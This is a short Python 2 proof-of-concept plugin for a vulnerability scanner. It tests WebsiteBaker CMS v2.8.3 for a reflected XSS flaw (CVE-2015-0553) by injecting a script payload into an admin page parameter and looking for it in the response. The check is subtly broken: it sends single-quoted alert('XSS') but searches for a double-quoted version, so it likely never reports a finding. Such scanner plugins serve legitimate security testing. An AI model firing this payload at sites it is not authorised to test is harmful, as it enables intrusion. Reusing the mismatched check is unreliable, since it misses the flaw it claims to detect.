# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = '64a00f68-17fe-4b72-9188-238a61f7f064'
    name = 'Websitebaker CMS v2.8.3 Reflecting XSS vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-01-05'  # 漏洞公布时间
    desc = '''
        隐藏表单中引发的反射XSS漏洞。
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0553'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'CVE-2015-0553'  # cve编号
    product = 'WebsiteBakerCMS'  # 漏洞应用名称
    product_version = 'v2.8.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '927fa621-cbfc-416f-a36a-d2140a8095dd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/admin/pages/modify.php?page_id=1%22><script>alert(%27XSS%27)</script><!--'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if '<script>alert("XSS")</script>' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
